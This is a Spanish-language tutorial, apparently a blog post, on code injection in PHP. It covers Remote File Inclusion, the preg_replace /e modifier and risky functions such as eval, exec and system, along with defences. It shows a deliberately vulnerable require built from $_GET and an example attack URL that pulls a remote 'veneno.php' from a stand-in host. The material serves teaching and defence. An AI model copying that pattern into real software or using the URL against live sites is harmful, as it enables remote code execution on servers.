**Indice de contenido**

1.  Introducción
2.  Mostrar el código al público
3.  Ataques RFI Remote File Inclusion
4.  Inyección por expresiones regulares
5.  Funciones vulnerables a Code Injection

### 1. Introducción

El _**Code Injection**_ es un tipo de ataque que permite al atacante **inyectar código fuente en la aplicación** de forma que es interpretado y ejecutado. Esto no incluye aquellos ataques en los que la víctima es un usuario de la aplicación, que son los [ataques CSRF](http://diego.com.es/ataques-csrf-cross-site-request-forgery-en-php).

El **código fuente** se puede insertar directamente desde un _**input**_, o la aplicación web puede ser manipulada para que lo cargue desde el **sistema de archivos local** o desde una **fuente externa** como una **URL**. Cuando la inyección se produce por la inclusión de un archivo externo se le denomina **Remote File Inclusion**, **RFI**, y su objetivo suele ser el de **inyectar código**.

Las principales causas por las que se pueden realizar este tipo de ataques son por un **fallo de validación de un input**, la inclusión de un **input no fiable** en cualquier contexto donde puede ser **evaluado como código PHP**, no asegurar correctamente los **repositorios del código fuente**, no tener precaución suficiente cuando se descargan **librerías externas**, o **configuraciones mal hechas del servidor** que permiten incluir archivos que no son PHP pero que se analizan como PHP en el servidor.

### 2. Mostrar el código al público

Normalmente las páginas que acaban en _**.php**_ serán **reenviadas a PHP desde Apache**, y por lo tanto el código será invisible para los usuarios. El hecho de que el código está escondido es una de las cosas que caracterizan a los **lenguajes del lado del servidor** como **PHP**. Pero el **módulo de PHP** o **Apache** pueden fallar por una **mala configuración** y el **código podría ser mostrado al público**. En ocasiones depende de cómo está diseñada la **estructura de directorios**. Lo ideal es que los archivos a los que accede el usuario estén separados de los del núcleo de la aplicación:
```
/aplicacion
  /controladores
  /modelos
  /vistas
/libreria
**/public_html**
  index.php
  /media
    /imagenes
    /js
    /css
```

### 3. Ataques RFI Remote File Inclusion

Algunos **ataques RFI** se producen por el uso de _**include**_ o _**require**_. Si se pasan datos sin sanitizar a estas funciones, un atacante puede **ejecutar código externo en el servidor**. Suponemos el siguiente código:

```
$pagina = isset($_GET['pagina']) ? $_GET['pagina'] : 'home';

require $pagina . '.php';
```

Es un **controlador** muy básico que requerirá el archivo proporcionado por el elemento _**$_GET['pagina']**_ (en caso de que esté definido).

Imaginemos que existe el archivo _http://ejemplo.com/veneno.php_, y nuestro script se encuentra en _http://misitio.com/index.php_. El atacante puede hacer este request: _http://misitio.com/index.php?pagina=http://ejemplo.com/veneno.php_. Este archivo será ejecutado cuando sea requerido y escribirá un nuevo archivo en el servidor. El archivo puede contener código que permita ejecutar comandos en la terminal, así como otro tipo de acciones.

Otra cosa que el atacante podría hacer es establecer _$pagina_ a _http://ejemplo.com/veneno.php?_ de forma que cualquier cosa que le siga al interrogante sea parte de la _**query string**_ y por tanto ignorada por el servidor en el que se está requiriendo el archivo. 

Para prevenir esto se pueden utilizar las **directivas del _php.ini_**:

*   _**allow_url_fopen**_, controla si los archivos externos deberían ser incluídos o no. Por defecto es **On**.
*   _**allow_url_include**_, controla si _include()_, _require()_, _include_once()_ y _require_once()_ deberían incluir archivos externos. Por defecto es **Off**.  Si _allow_url_fopen_ es off, esta será ignorada (off también).

Existen **alternativas para evitar ataques RFI desde Apache**, como [esta](http://www.phpfreaks.com/tutorial/preventing-remote-file-include-attacks-with-mod-rewrite). 

### 4. Inyección por expresiones regulares

La función **PCRE** _preg_replace_ en PHP permite al modificador /e (PREG_REPLACE_EVAL) hacer que lo que reemplace se interprete como código PHP después de la sustitución. Cualquier _**input**_ que se interprete con esta función y el modificador /e podrá ser por tanto un **código PHP que será evaluado y ejecutado**. Una solución para evitar esta posible inyección es utilizando la función _**preg_replace_callback()**_ en lugar de _**preg_replace()**_ cuando se usa el **modificador /e**.

### 5. Funciones vulnerables a Code Injection

La función _**eval()**_ permite **incluir strings como código PHP para ser evaluado**, es insegura y se ha de tratar de evitarla en lo máximo posible.

La función _**exec()**_ ejecuta comandos de programas externos en PHP. Por ejemplo:

```
echo exec('whoami');
```

La función _**system()**_ ejecuta un programa externo a PHP y muestra el _**output**_, devolviendo la última línea del output del comando en caso de tener éxito. Acepta un **argumento por referencia opcional** donde iría el comando devuelvo.

Las **comillas de ejecución**, u **operadores de ejecución** (_back ticks_), son estas : ``, y permiten que PHP ejecute el código que está en su interior como si fuera un comando de la terminal. Equivale a utilizar la función _**shell_exec()**_. Este operador se deshabilita cuando el modo seguro está activado o _shell_exec()_ está desactivado. No tienen significado especial dentro de las comillas dobles.

Para evitar que este tipo de funciones puedan manipularse y afectar de forma inesperada al sistema, conviene utilizar las funciones _**escapeshellarg()**_, que escapa un _**string**_ para que se pueda usar de forma más segura como comando, o _**escapeshellcmd()**_, que escapa **metacaracteres** de un _**string**_ por la misma razón. 

También conviene trabajar lo menos posible con los **directorios completos**, usando la función _**basename()**_, que devuelve el último componente de una ruta, por ejemplo: 

```
$directorio = "/home/carpeta/hola.php";
echo basename($directorio); // Devuelve: hola.php
```
